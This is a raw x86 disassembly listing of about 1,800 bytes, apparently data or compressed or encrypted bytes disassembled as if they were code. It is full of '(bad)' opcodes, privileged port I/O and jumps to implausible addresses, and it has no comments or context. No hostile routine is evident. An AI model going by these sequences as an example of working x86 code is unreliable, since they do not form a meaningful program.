  42f911:	add    DWORD PTR es:[ecx],edx
  42f914:	lods   al,BYTE PTR ds:[esi]
  42f915:	leave  
  42f916:	jg     0x42f8cb
  42f918:	mov    ds:0xea91f04f,al
  42f91d:	and    DWORD PTR [eax-0x70a559a8],eax
  42f923:	imul   edi,DWORD PTR [edi-0x6ece404a],0x16
  42f92a:	fnstsw WORD PTR [eax]
  42f92c:	jmp    0x2a74cdc9
  42f931:	jge    0x42f971
  42f933:	and    eax,0xdab4146e
  42f938:	add    al,0x83
  42f93a:	xchg   ecx,eax
  42f93b:	cmc    
  42f93c:	mov    DWORD PTR [edx+eiz*8],ebp
  42f93f:	std    
  42f940:	jne    0x42f909
  42f942:	cmp    dl,al
  42f944:	inc    esp
  42f945:	loop   0x42f92a
  42f947:	push   ebx
  42f948:	loope  0x42f948
  42f94a:	lods   eax,DWORD PTR ds:[esi]
  42f94b:	mov    ecx,0x5fd211ca
  42f950:	ret    
  42f951:	in     eax,0xb8
  42f953:	dec    ecx
  42f954:	xchg   bp,ax
  42f956:	ret    
  42f957:	cmp    edi,DWORD PTR [edi+0x28ba9d4c]
  42f95d:	pop    ds
  42f95e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f95f:	ror    BYTE PTR ds:0x894ae411,cl
  42f965:	mov    bl,0xd0
  42f967:	into   
  42f968:	inc    edi
  42f969:	xor    al,0xe4
  42f96b:	jg     0x42f9cb
  42f96d:	adc    DWORD PTR [edi],edi
  42f96f:	cmp    bl,BYTE PTR [edi+0x6180b97]
  42f975:	sub    al,0x89
  42f977:	test   BYTE PTR [edi-0x2a],bh
  42f97a:	xor    al,0x37
  42f97c:	or     esp,0x8c352460
  42f982:	jp     0x42f942
  42f984:	loope  0x42f9fa
  42f986:	adc    eax,0xe9bc1e1c
  42f98b:	jmp    0x1a822458
  42f990:	in     eax,dx
  42f991:	adc    al,0x74
  42f993:	or     edx,ebx
  42f995:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f996:	sar    DWORD PTR [esi+0x18c99bda],cl
  42f99c:	sbb    esi,esp
  42f99e:	(bad)  
  42f9a0:	pop    es
  42f9a1:	mov    eax,ds:0x26ab0683
  42f9a6:	aaa    
  42f9a7:	add    ah,dh
  42f9a9:	pop    ss
  42f9aa:	mov    ebp,0x39500535
  42f9af:	stc    
  42f9b0:	(bad)  
  42f9b1:	rol    esi,cl
  42f9b3:	or     ch,BYTE PTR [ebp+0x6]
  42f9b6:	call   0x5c1c:0x5e310c55
  42f9bd:	xor    al,0xe3
  42f9bf:	adc    ah,BYTE PTR [edx+0x705959eb]
  42f9c5:	mov    BYTE PTR fs:[eax+0x7],bh
  42f9c9:	pop    ecx
  42f9ca:	pop    esi
  42f9cb:	xor    ch,BYTE PTR [eax]
  42f9cd:	pop    ecx
  42f9ce:	je     0x42f954
  42f9d0:	cmp    BYTE PTR [edx+0x8534050],dl
  42f9d6:	lea    eax,[ebx-0x5a]
  42f9d9:	fistp  DWORD PTR [esi+0x6c]
  42f9dc:	sbb    BYTE PTR [ebx+0x6e6fb6f8],al
  42f9e2:	jl     0x42fa35
  42f9e4:	cs iret 
  42f9e6:	dec    esp
  42f9e7:	jo     0x42f96b
  42f9e9:	sbb    esi,DWORD PTR ds:0xa780b91a
  42f9ef:	fistp  DWORD PTR [ebp+0x25]
  42f9f2:	and    eax,0xc0540f74
  42f9f7:	aad    0xd
  42f9f9:	xchg   ecx,eax
  42f9fa:	test   al,0xc1
  42f9fc:	dec    ebp
  42f9fd:	jnp    0x42fa2b
  42f9ff:	push   ss
  42fa00:	fdiv   QWORD PTR [ecx+0x4f66b382]
  42fa06:	add    dl,BYTE PTR [ebx-0x232572fd]
  42fa0c:	pop    ecx
  42fa0d:	push   0xf668dbf7
  42fa12:	iret   
  42fa13:	xor    BYTE PTR [ebp+0x55],ch
  42fa16:	sbb    BYTE PTR [edi+ebp*1-0x42336dea],ah
  42fa1d:	and    DWORD PTR [esi+eiz*4-0xc508451],edx
  42fa24:	mov    eax,ds:0xaf020b7e
  42fa29:	add    al,0x2
  42fa2b:	mov    ecx,0x2ef81810
  42fa30:	dec    ecx
  42fa31:	popf   
  42fa32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa33:	in     eax,0xc6
  42fa35:	sbb    esp,DWORD PTR [eax+0x22]
  42fa38:	xor    BYTE PTR [eax+ebp*1],dl
  42fa3b:	imul   esp,DWORD PTR [esi],0x50
  42fa3e:	and    bl,BYTE PTR [edi-0x5b927b9f]
  42fa44:	inc    esi
  42fa45:	mov    ds:0xeb0a68f7,al
  42fa4a:	cdq    
  42fa4b:	into   
  42fa4c:	shl    DWORD PTR [esi+edi*4+0x5c],1
  42fa50:	sbb    esi,DWORD PTR [ebx]
  42fa52:	(bad)  
  42fa53:	loopne 0x42f9dd
  42fa55:	mov    dh,BYTE PTR [ebx+0x64831376]
  42fa5b:	dec    ecx
  42fa5c:	pop    esi
  42fa5d:	inc    edi
  42fa5e:	ss xchg esp,eax
  42fa60:	xchg   BYTE PTR [edx-0x1cb9cf4f],ah
  42fa66:	pop    ss
  42fa67:	adc    cl,BYTE PTR [edi+0x36]
  42fa6a:	jb     0x42fac2
  42fa6c:	xlat   BYTE PTR ds:[ebx]
  42fa6d:	push   ds
  42fa6e:	popf   
  42fa6f:	dec    ecx
  42fa70:	stos   BYTE PTR es:[edi],al
  42fa71:	add    al,0xa5
  42fa73:	mov    edx,0x6365bbfc
  42fa78:	jmp    0x42fab0
  42fa7a:	out    0xda,eax
  42fa7c:	sbb    eax,0xaf6da414
  42fa81:	sbb    DWORD PTR [ebp-0x4c],esp
  42fa84:	fisttp DWORD PTR [esi+0x40]
  42fa87:	sar    BYTE PTR [edx],1
  42fa89:	mov    dh,0x61
  42fa8b:	xchg   edx,eax
  42fa8c:	outs   dx,DWORD PTR ds:[esi]
  42fa8d:	xlat   BYTE PTR ds:[ebx]
  42fa8e:	or     BYTE PTR [esi+edi*8-0x54b3df0],bl
  42fa95:	fist   WORD PTR [ecx-0x24bbd909]
  42fa9b:	ret    
  42fa9c:	xchg   ecx,eax
  42fa9d:	lods   eax,DWORD PTR ds:[esi]
  42fa9e:	add    bl,BYTE PTR [edi+0x3a0c2beb]
  42faa4:	jno    0x42facc
  42faa6:	loopne 0x42fa7e
  42faa8:	or     eax,DWORD PTR [esi]
  42faaa:	pop    esp
  42faab:	sub    ah,al
  42faad:	sub    BYTE PTR [ebp+0x76],0x10
  42fab1:	lds    edi,FWORD PTR [esi+eiz*8]
  42fab4:	shl    DWORD PTR [edi-0x2],cl
  42fab7:	outs   dx,DWORD PTR ds:[esi]
  42fab8:	xchg   al,bl
  42faba:	mov    al,0x33
  42fabc:	dec    esi
  42fabd:	xchg   edx,eax
  42fabe:	(bad)  
  42fabf:	add    dl,dl
  42fac1:	icebp  
  42fac2:	xchg   edx,eax
  42fac3:	cmp    al,0xd0
  42fac5:	outs   dx,BYTE PTR ss:[esi]
  42fac7:	sbb    BYTE PTR [ebx+ebp*2+0x63],bh
  42facb:	cmp    al,0x5c
  42facd:	sti    
  42face:	(bad)  
  42facf:	push   ecx
  42fad0:	pop    eax
  42fad1:	inc    eax
  42fad2:	xchg   ecx,eax
  42fad3:	pop    edi
  42fad4:	pop    ebp
  42fad5:	jle    0x42fa92
  42fad7:	and    al,0xc1
  42fad9:	loopne 0x42fa8c
  42fadb:	rol    BYTE PTR [ebx+ecx*8-0x70],1
  42fadf:	es xor edx,ebp
  42fae2:	xor    BYTE PTR [ebp+0xf],dl
  42fae5:	lock mov dh,ch
  42fae8:	add    edx,esp
  42faea:	mov    ds:0x2f8605e,al
  42faef:	dec    esp
  42faf0:	pop    eax
  42faf1:	fisub  DWORD PTR [ebp+0x12]
  42faf4:	xor    BYTE PTR [edx+0x391e5e20],cl
  42fafa:	and    al,BYTE PTR cs:[ebx]
  42fafd:	je     0x42fa97
  42faff:	call   0x1ffedd6
  42fb04:	xchg   ebp,eax
  42fb05:	or     edx,DWORD PTR es:[ebx-0x42192aa0]
  42fb0c:	ret    0x9c61
  42fb0f:	out    0xb6,al
  42fb11:	or     BYTE PTR [eax+0x40],al
  42fb14:	xor    eax,0xff77dc5b
  42fb19:	shr    dl,0x3e
  42fb1c:	dec    eax
  42fb1d:	mov    ds:0xe8f5b2a5,eax
  42fb22:	icebp  
  42fb23:	in     eax,0x78
  42fb25:	scas   eax,DWORD PTR es:[edi]
  42fb26:	scas   eax,DWORD PTR es:[edi]
  42fb27:	ds jae 0x42fb7a
  42fb2a:	push   es
  42fb2b:	mov    bh,0x99
  42fb2d:	daa    
  42fb2e:	push   ds
  42fb2f:	mov    bl,0xda
  42fb31:	push   0x2f
  42fb33:	ss fwait
  42fb35:	adc    eax,0xaca93c23
  42fb3a:	inc    edx
  42fb3b:	or     ebp,DWORD PTR [edx]
  42fb3d:	pop    ebp
  42fb3e:	mov    ecx,0xd0bb5a7e
  42fb43:	fld    QWORD PTR [esi-0x80]
  42fb46:	fsubp  st(0),st
  42fb48:	sub    eax,0x99b116ce
  42fb4d:	call   0xeefee6a4
  42fb52:	jmp    0x4bde26d3
  42fb57:	into   
  42fb58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fb59:	jmp    0x42fbd0
  42fb5b:	push   esp
  42fb5c:	inc    edx
  42fb5d:	rol    BYTE PTR [edi],1
  42fb5f:	jae    0x42fb61
  42fb61:	mov    ch,BYTE PTR [edi+0x6b]
  42fb64:	add    esi,DWORD PTR [eax]
  42fb66:	sbb    BYTE PTR [ebx],0xce
  42fb69:	adc    DWORD PTR [ebx],esi
  42fb6b:	test   BYTE PTR [ebx+0x71],0xde
  42fb6f:	mov    ebp,esi
  42fb71:	fs jb  0x42fbb1
  42fb74:	pusha  
  42fb75:	rcl    BYTE PTR [eax+0x2b742429],1
  42fb7b:	in     al,0x46
  42fb7d:	push   ebx
  42fb7e:	jp     0x42fb37
  42fb80:	bound  edx,QWORD PTR ds:0xc47959a1
  42fb86:	xchg   edx,eax
  42fb87:	out    dx,al
  42fb88:	add    DWORD PTR [ebx-0x6a76df2a],ebp
  42fb8e:	fisubr WORD PTR [esi]
  42fb90:	sbb    esp,DWORD PTR [esi-0x6678b8e7]
  42fb96:	nop
  42fb97:	hlt    
  42fb98:	mov    ch,0xfa
  42fb9a:	es out dx,eax
  42fb9c:	popa   
  42fb9d:	(bad)  
  42fb9e:	adc    ecx,DWORD PTR [esi+0x3d]
  42fba1:	push   esi
  42fba2:	enter  0x28c1,0xe0
  42fba6:	aas    
  42fba7:	arpl   WORD PTR [esi-0x41415da5],ax
  42fbad:	inc    esp
  42fbae:	imul   ebx,ebp,0xffffffc9
  42fbb1:	inc    ecx
  42fbb2:	bound  edi,QWORD PTR [ebp+0x22]
  42fbb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fbb6:	and    edx,edx
  42fbb8:	imul   DWORD PTR [edi]
  42fbba:	jnp    0x42fb98
  42fbbc:	xchg   edx,eax
  42fbbd:	outs   dx,BYTE PTR ds:[esi]
  42fbbe:	inc    ecx
  42fbbf:	pop    esi
  42fbc0:	ror    DWORD PTR [edx],0x7
  42fbc3:	mov    ch,BYTE PTR [ecx+edi*8]
  42fbc6:	popf   
  42fbc7:	sub    BYTE PTR [eax+edi*1-0x1d86317e],0xb0
  42fbcf:	jecxz  0x42fc14
  42fbd1:	les    ebp,FWORD PTR [esi]
  42fbd3:	popa   
  42fbd4:	stos   DWORD PTR es:[edi],eax
  42fbd5:	in     eax,dx
  42fbd6:	add    DWORD PTR [edi-0x1b33c2f2],ebx
  42fbdc:	xchg   ebp,eax
  42fbdd:	ficom  WORD PTR [ebp+0x7f]
  42fbe0:	sub    edx,DWORD PTR [ebx+0x6a]
  42fbe3:	or     dh,BYTE PTR [ecx-0x61b03c51]
  42fbe9:	mov    al,ds:0x379d25ea
  42fbee:	aad    0x84
  42fbf0:	test   DWORD PTR [esi-0x70],ebp
  42fbf3:	dec    esp
  42fbf4:	nop
  42fbf5:	inc    esp
  42fbf6:	lods   al,BYTE PTR ds:[esi]
  42fbf7:	clc    
  42fbf8:	test   eax,0x9364144a
  42fbfd:	pusha  
  42fbfe:	mov    al,0xbc
  42fc00:	adc    BYTE PTR [ecx-0x3],bl
  42fc03:	sbb    edx,edi
  42fc05:	in     al,0xee
  42fc07:	or     edx,DWORD PTR [ecx-0x586085ed]
  42fc0d:	pop    esi
  42fc0e:	and    DWORD PTR [ecx+0x265731c0],0xf2f61911
  42fc18:	pop    eax
  42fc19:	xchg   esi,eax
  42fc1a:	push   es
  42fc1b:	pop    ecx
  42fc1c:	retf   0x5026
  42fc1f:	loope  0x42fc6f
  42fc21:	sub    BYTE PTR [ebp+ecx*2-0x61a2820],bh
  42fc28:	mov    ebp,0xd130d859
  42fc2d:	or     al,0xbe
  42fc2f:	int3   
  42fc30:	or     dl,0xe7
  42fc33:	out    dx,al
  42fc34:	es pop ebp
  42fc36:	les    eax,FWORD PTR [eax+0x7f]
  42fc39:	xchg   ecx,eax
  42fc3a:	xor    ecx,DWORD PTR [esi-0x39]
  42fc3d:	std    
  42fc3e:	out    dx,eax
  42fc3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fc40:	add    ah,BYTE PTR [ebx]
  42fc42:	arpl   WORD PTR [eax],bx
  42fc44:	xchg   esp,eax
  42fc45:	sbb    DWORD PTR [edi+esi*1+0x38554925],eax
  42fc4c:	fst    DWORD PTR [ebp+0x5d52925a]
  42fc52:	mov    dh,0xd2
  42fc54:	adc    ecx,DWORD PTR [edi+0x37]
  42fc57:	sub    ch,BYTE PTR [ecx+ecx*4+0x30bb372c]
  42fc5e:	mov    es:0x87e8ceea,eax
  42fc64:	retf   0xa8cf
  42fc67:	cmp    al,0x9e
  42fc69:	sbb    al,0x52
  42fc6b:	jl     0x42fcc8
  42fc6d:	xor    edx,DWORD PTR [edi+0x49]
  42fc70:	aas    
  42fc71:	cmp    bl,BYTE PTR [eax-0x74]
  42fc74:	mov    DWORD PTR [ecx+0x49],edi
  42fc77:	jnp    0x42fc86
  42fc79:	fdiv   DWORD PTR [eax+0x60]
  42fc7c:	iret   
  42fc7d:	push   0x7ef15fd7
  42fc82:	shl    BYTE PTR [ecx+0x23],1
  42fc85:	jae    0x42fc15
  42fc87:	cmp    BYTE PTR [eax],dh
  42fc89:	dec    edi
  42fc8a:	jnp    0x42fcc0
  42fc8c:	sti    
  42fc8d:	icebp  
  42fc8e:	adc    al,0x5c
  42fc90:	mov    eax,DWORD PTR [eax+0x7f092e71]
  42fc96:	inc    esi
  42fc97:	(bad)  
  42fc98:	jnp    0x42fc38
  42fc9a:	rcr    edx,1
  42fc9c:	dec    eax
  42fc9d:	dec    ebp
  42fc9e:	push   eax
  42fc9f:	add    ecx,edx
  42fca1:	push   edi
  42fca2:	mov    al,0xa5
  42fca4:	jns    0x42fcc3
  42fca6:	aad    0xa0
  42fca8:	hlt    
  42fca9:	dec    edx
  42fcaa:	mov    ecx,?
  42fcac:	add    cl,BYTE PTR [ecx-0x476ecf1e]
  42fcb2:	inc    edi
  42fcb3:	and    DWORD PTR [ecx],edi
  42fcb5:	jl     0x42fc8c
  42fcb7:	xor    cl,cl
  42fcb9:	(bad)  
  42fcba:	das    
  42fcbb:	jmp    0x681e:0xb3dd806
  42fcc2:	rcr    DWORD PTR gs:[eax-0x2],1
  42fcc6:	test   eax,0x5360df7b
  42fccb:	call   0xbc47d806
  42fcd0:	xchg   DWORD PTR [edi+0x376e80eb],esp
  42fcd6:	mov    ch,0x3d
  42fcd8:	fistp  DWORD PTR [edx]
  42fcda:	lea    ebx,[ecx+0x36]
  42fcdd:	mov    al,BYTE PTR [ebx+0xf]
  42fce0:	mov    esi,0x6cbbb5e2
  42fce5:	(bad)  
  42fce6:	scas   eax,DWORD PTR es:[edi]
  42fce7:	les    ebx,FWORD PTR [ebx]
  42fce9:	out    dx,al
  42fcea:	push   esi
  42fceb:	xor    BYTE PTR ss:[eax+ecx*4-0x29],dh
  42fcf0:	out    0x67,al
  42fcf2:	sub    BYTE PTR [eax+edx*4-0xd6d1899],dh
  42fcf9:	loop   0x42fd13
  42fcfb:	dec    eax
  42fcfc:	ret    0x850b
  42fcff:	lea    ebx,[esi+ecx*8-0x4a386ea4]
  42fd06:	mov    ds:0x429f645,al
  42fd0b:	cmp    DWORD PTR [edi-0x4b],ebx
  42fd0e:	in     al,0x13
  42fd10:	add    DWORD PTR [ebx],0x17b82456
  42fd16:	dec    esp
  42fd17:	in     al,dx
  42fd18:	pop    eax
  42fd19:	loope  0x42fd2e
  42fd1b:	pop    esi
  42fd1c:	adc    ebx,DWORD PTR [edx+0x47c49a71]
  42fd22:	fild   WORD PTR [ebx-0x27251501]
  42fd28:	mov    ah,0xec
  42fd2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fd2b:	fisubr WORD PTR [eax+edi*8]
  42fd2e:	pushf  
  42fd2f:	dec    eax
  42fd30:	out    dx,eax
  42fd31:	test   eax,0xdf1e9bfb
  42fd36:	iret   
  42fd37:	push   0x35
  42fd39:	and    BYTE PTR [edx],0x51
  42fd3c:	dec    DWORD PTR [edx]
  42fd3e:	adc    DWORD PTR ds:[eax],esp
  42fd41:	rcl    BYTE PTR [edi+0x69],1
  42fd44:	adc    DWORD PTR [ecx+0x33ee7e78],eax
  42fd4a:	sbb    DWORD PTR [ebx],esp
  42fd4c:	dec    esi
  42fd4d:	mov    ah,0xec
  42fd4f:	lock mov bh,BYTE PTR [ebp+edi*8+0x47]
  42fd54:	aad    0x1e
  42fd56:	pop    ebp
  42fd57:	mov    esi,0x74c563b7
  42fd5c:	xor    BYTE PTR [edx+edx*8+0x6f],bl
  42fd60:	pop    edi
  42fd61:	sbb    ah,BYTE PTR [ecx+0x39]
  42fd64:	mov    esp,0x15d7ec47
  42fd69:	inc    esp
  42fd6a:	pushf  
  42fd6b:	mul    BYTE PTR [ecx+0x5f]
  42fd6e:	ret    0x6930
  42fd71:	repz mov dh,0x6
  42fd74:	inc    ebp
  42fd75:	call   0x6696:0x7d05a770
  42fd7c:	and    bl,BYTE PTR [ecx-0x60ac3cf5]
  42fd82:	dec    ebx
  42fd83:	cdq    
  42fd84:	push   ds
  42fd85:	add    eax,0x179f5b60
  42fd8a:	fist   WORD PTR ds:0x50caf312
  42fd90:	in     eax,0x6c
  42fd92:	inc    ebp
  42fd93:	neg    DWORD PTR [ebx]
  42fd95:	xor    eax,0x584219f
  42fd9a:	inc    eax
  42fd9b:	lods   eax,DWORD PTR ds:[esi]
  42fd9c:	jl     0x42fd2d
  42fd9e:	mov    ds:0x1bb9f3f9,al
  42fda3:	sbb    dh,dh
  42fda5:	or     BYTE PTR [edi-0x2],dl
  42fda8:	dec    edx
  42fda9:	inc    edi
  42fdaa:	pop    esp
  42fdab:	mov    ds:0xd185ccd0,al
  42fdb0:	adc    DWORD PTR [edx],ecx
  42fdb2:	dec    edi
  42fdb3:	mov    DWORD PTR [edx],edx
  42fdb5:	add    BYTE PTR [esi],bl
  42fdb7:	popa   
  42fdb8:	fimul  DWORD PTR [ecx-0x4e]
  42fdbb:	out    dx,eax
  42fdbc:	or     eax,0x8ea1dbc
  42fdc1:	jae    0x42fdb1
  42fdc3:	add    dl,BYTE PTR [ecx-0x1c]
  42fdc6:	and    eax,0xe8a7a451
  42fdcb:	dec    ecx
  42fdcc:	push   cs
  42fdcd:	outs   dx,BYTE PTR ds:[esi]
  42fdce:	mov    BYTE PTR [eax+0x5e],bh
  42fdd1:	dec    bl
  42fdd3:	mov    dl,0xce
  42fdd5:	xchg   ebx,eax
  42fdd6:	jbe    0x42fe2d
  42fdd8:	in     eax,0x19
  42fdda:	iret   
  42fddb:	sub    ecx,DWORD PTR [eax]
  42fddd:	dec    ebx
  42fdde:	adc    DWORD PTR [ebx-0x76916a88],esi
  42fde4:	das    
  42fde5:	push   cs
  42fde6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fde7:	or     al,0x62
  42fde9:	xchg   ebp,eax
  42fdea:	lds    esi,FWORD PTR [eax]
  42fdec:	and    DWORD PTR [edx-0x31],edx
  42fdef:	popf   
  42fdf0:	mov    WORD PTR [ebx+ebp*8-0x66],fs
  42fdf4:	mov    al,ds:0xc684b9fb
  42fdf9:	mov    dh,0x8c
  42fdfb:	stos   DWORD PTR es:[edi],eax
  42fdfc:	xor    edi,0xffffffee
  42fdff:	addr16 bnd ja 0x42fe5b
  42fe03:	repz sbb edx,esi
  42fe06:	push   ds
  42fe07:	pop    ebx
  42fe08:	cli    
  42fe09:	pusha  
  42fe0a:	lds    eax,FWORD PTR [ebp-0x583407d6]
  42fe10:	inc    ecx
  42fe11:	or     DWORD PTR [ecx-0x56],edi
  42fe14:	mov    al,ds:0x754d968a
  42fe19:	or     eax,0xb4520a05
  42fe1f:	test   eax,0x855b3a0b
  42fe24:	xchg   edi,eax
  42fe25:	add    BYTE PTR [eax-0xb7b8016],0x1a
  42fe2c:	push   ds
  42fe2d:	mov    esi,0xfc3bff39
  42fe32:	arpl   WORD PTR [esi-0x76],di
  42fe35:	push   ss
  42fe36:	lds    esi,FWORD PTR [ebp-0x4651979f]
  42fe3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe3d:	icebp  
  42fe3e:	add    bh,BYTE PTR ds:0x3a4ed6
  42fe44:	fcomi  st,st(7)
  42fe46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe47:	rcr    DWORD PTR [eax],0x1b
  42fe4a:	test   DWORD PTR [edx],ebp
  42fe4c:	int3   
  42fe4d:	out    dx,eax
  42fe4e:	stos   DWORD PTR es:[edi],eax
  42fe4f:	lds    ebp,FWORD PTR [esi]
  42fe51:	mov    ds:0xa94414f7,al
  42fe56:	jmp    DWORD PTR [esi+ebp*2+0x7a6fb41f]
  42fe5d:	mov    eax,ds:0x93b68204
  42fe62:	mov    eax,0x39f92dc1
  42fe67:	(bad)  
  42fe68:	out    dx,eax
  42fe69:	xchg   DWORD PTR [ebx+0x48],edx
  42fe6c:	mov    esp,0x5b7438ba
  42fe71:	xor    eax,0x2407e1b3
  42fe76:	repz mov ebp,0x4df57d13
  42fe7c:	push   eax
  42fe7d:	mov    esp,0xc76d4157
  42fe82:	mov    ebx,0x80f7f370
  42fe87:	cmp    DWORD PTR [eax+0x6a],ebp
  42fe8a:	push   es
  42fe8b:	sub    al,0x3b
  42fe8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe8e:	jmp    0x42fe74
  42fe90:	xchg   dl,dl
  42fe92:	mov    ebp,0x9041069
  42fe97:	rol    DWORD PTR [edx+ebx*2+0x58],cl
  42fe9b:	out    dx,al
  42fe9c:	dec    ebp
  42fe9d:	adc    al,0x89
  42fe9f:	test   eax,0x1620d497
  42fea4:	sbb    ecx,DWORD PTR [edx+ebx*2]
  42fea7:	lock push ecx
  42fea9:	mov    esp,0x17c84c82
  42feae:	test   BYTE PTR [esi+0x2262a867],0x96
  42feb5:	test   eax,0x91e52c15
  42feba:	pop    ebp
  42febb:	jno    0x42fe93
  42febd:	inc    edx
  42febe:	xor    ch,BYTE PTR [esi]
  42fec0:	push   ds
  42fec1:	js     0x42fe9d
  42fec3:	xor    al,0x19
  42fec5:	jmp    0xc783537b
  42feca:	mov    edi,edx
  42fecc:	mov    ch,0x10
  42fece:	ins    BYTE PTR es:[edi],dx
  42fecf:	(bad)
  42fed2:	mov    bh,0x1a
  42fed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fed5:	cmp    eax,0xb8ee4279
  42feda:	outs   dx,DWORD PTR ds:[esi]
  42fedb:	sub    al,0x4f
  42fedd:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42fedf:	ds mov dl,0xb1
  42fee2:	dec    esi
  42fee3:	iret   
  42fee4:	cld    
  42fee5:	repz mov edi,0x40fd9ff9
  42feeb:	mov    eax,ds:0xb49d49bb
  42fef0:	xchg   ecx,eax
  42fef1:	adc    cl,ah
  42fef3:	mov    ecx,0x4018f697
  42fef8:	push   ebp
  42fef9:	push   0x16
  42fefb:	jne    0x42ff1b
  42fefd:	adc    eax,0x36d1bdd
  42ff03:	mov    edi,0x9c954d09
  42ff08:	sub    DWORD PTR es:[ebp+0x539a1708],edi
  42ff0f:	fcmovnbe st,st(6)
  42ff11:	daa    
  42ff12:	clc    
  42ff13:	inc    eax
  42ff14:	and    eax,0x11dbe648
  42ff19:	sbb    dl,al
  42ff1b:	mov    ecx,DWORD PTR [esi+esi*4-0xb76c2dc]
  42ff22:	cmp    al,0x33
  42ff24:	fidivr DWORD PTR es:[edi-0x6b]
  42ff28:	ror    DWORD PTR [ecx+0x47],1
  42ff2b:	xor    esi,DWORD PTR [esi+0x34]
  42ff2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ff2f:	dec    ecx
  42ff30:	jae    0x42ff77
  42ff32:	arpl   WORD PTR [eax],cx
  42ff34:	or     eax,0x4300fc67
  42ff39:	popf   
  42ff3a:	pop    ebp
  42ff3b:	fs jle 0x42ffb0
  42ff3e:	and    al,0x6d
  42ff40:	jmp    0x42ff80
  42ff42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff43:	call   0xf726aefe
  42ff48:	mov    ds:0x58e19b51,al
  42ff4d:	jg     0x42ff42
  42ff4f:	sub    DWORD PTR [edi+0x7d],0xffffff9b
  42ff53:	or     bh,ah
  42ff55:	pop    eax
  42ff56:	push   0xc5773b5d
  42ff5b:	adc    edx,esp
  42ff5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff5e:	cmp    esi,edx
  42ff60:	mov    edx,0x27ac9823
  42ff65:	push   ecx
  42ff66:	mov    al,BYTE PTR [edx+0x73]
  42ff69:	jle    0x42ff88
  42ff6b:	jnp    0x42ffa3
  42ff6d:	push   cs
  42ff6e:	mov    cl,0xe8
  42ff70:	sar    esp,0xa5
  42ff73:	aas    
  42ff74:	cwde   
  42ff75:	bound  ebx,QWORD PTR [esi+0x6711a6d]
  42ff7b:	sub    ebx,ecx
  42ff7d:	fdivr  DWORD PTR [esi]
  42ff7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff80:	push   ecx
  42ff81:	je     0x42ff18
  42ff83:	fistp  QWORD PTR ds:0x3ccabb5e
  42ff89:	rol    DWORD PTR [eax-0x33],cl
  42ff8c:	adc    al,0xfa
  42ff8e:	fbstp  TBYTE PTR [ebp-0x6780d164]
  42ff94:	push   ds
  42ff95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ff96:	mov    BYTE PTR [ecx+0x21],al
  42ff99:	mov    es,WORD PTR [ebx-0x6]
  42ff9c:	scas   al,BYTE PTR es:[edi]
  42ff9d:	jmp    0xf158f99a
  42ffa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ffa3:	ficom  WORD PTR [eax-0x21653ad4]
  42ffa9:	lahf   
  42ffaa:	ins    DWORD PTR es:[edi],dx
  42ffab:	invd   
  42ffad:	mov    bl,0x7a
  42ffaf:	arpl   WORD PTR [ebx],cx
  42ffb1:	out    0x15,al
  42ffb3:	(bad)  
  42ffb4:	mov    ch,0x57
  42ffb6:	test   DWORD PTR [ebp+0x30],ebx
  42ffb9:	daa    
  42ffba:	jecxz  0x430028
  42ffbc:	ins    DWORD PTR es:[edi],dx
  42ffbd:	maxps  xmm3,xmm3
  42ffc0:	loope  0x430008
  42ffc2:	pop    edx
  42ffc3:	int    0xbc
  42ffc5:	push   ebp
  42ffc6:	inc    esi
  42ffc7:	cmp    al,0x9b
  42ffc9:	sbb    cl,bl
  42ffcb:	rcr    DWORD PTR [edi-0x6df7f414],0x16
  42ffd2:	stc    
  42ffd3:	xchg   esp,eax
  42ffd4:	faddp  st(3),st
  42ffd6:	jmp    0x430012
  42ffd8:	inc    ebx
  42ffd9:	xchg   ecx,eax
  42ffda:	mov    al,ds:0x4d91379b
  42ffdf:	jle    0x42ff8d
  42ffe1:	inc    esi
  42ffe2:	inc    edi
  42ffe3:	mov    ebx,0x3f5d7b25
  42ffe8:	daa    
  42ffe9:	jo     0x430036
  42ffeb:	and    BYTE PTR [edi],al
  42ffed:	pop    es
  42ffee:	(bad)  
  42ffef:	pushf  
  42fff0:	in     al,0x2f
  42fff2:	dec    edi
  42fff3:	(bad)  
  42fff4:	(bad)  
  42fff5:	xor    al,dh
  42fff7:	add    eax,0xf6705231
  42fffc:	or     DWORD PTR [edi-0x68],edx
  42ffff:	fs pop esp
  430001:	xor    dl,BYTE PTR [ecx+ebx*4]
  430004:	xor    ebx,DWORD PTR [ecx-0x2b]
  430007:	ret    
  430008:	xor    DWORD PTR [esi],ebx
  43000a:	fiadd  DWORD PTR [edi-0x40a98234]
  430010:	cdq    
  430011:	dec    eax
  430012:	inc    ecx
  430013:	lds    esp,FWORD PTR [ebx+0x66]
  430016:	cmp    DWORD PTR [edi],edi
  430018:	ins    BYTE PTR es:[edi],dx
  430019:	adc    al,0xc6
  43001b:	in     al,0x6e
  43001d:	jmp    0x9741:0x371d4836
  430024:	xchg   DWORD PTR [eax],ebp
  430026:	pop    es
  430027:	add    BYTE PTR [esi-0x358bb11f],dh
  43002d:	daa    
  43002e:	(bad)  
  43002f:	mov    edi,ss
  430031:	stc    
  430032:	imul   esi,eax,0x79
  430035:	xchg   ebp,eax
  430036:	or     DWORD PTR [edx+0x78],esi
  430039:	push   edi
  43003a:	in     eax,0x1a
  43003c:	adc    esi,ebx
  43003e:	icebp  
  43003f:	repnz imul edi,DWORD PTR [edx],0x933e0926
  430046:	pushf  
